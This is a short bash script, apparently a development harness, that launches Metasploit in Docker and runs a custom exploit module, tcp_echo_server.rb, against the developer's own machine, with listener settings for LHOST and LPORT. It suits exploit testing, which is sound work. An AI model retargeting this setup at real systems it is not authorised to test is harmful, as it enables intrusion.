#!/bin/bash

# Local host IP address
LHOST=$(ifconfig en1 | grep "inet " | awk '{print $2}')
if [[ "$LHOST" == "" ]]; then
  LHOST=$(ifconfig en0 | grep "inet " | awk '{print $2}')
fi
LPORT=5555

# Remote host is the local host for development
RHOST="$LHOST"
RPORT=8080

docker run -it -p $LPORT:$LPORT -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use exploit/custom/tcp_echo_server.rb; set RHOST $RHOST; set RPORT $RPORT; set LHOST $LHOST; set LPORT $LPORT"
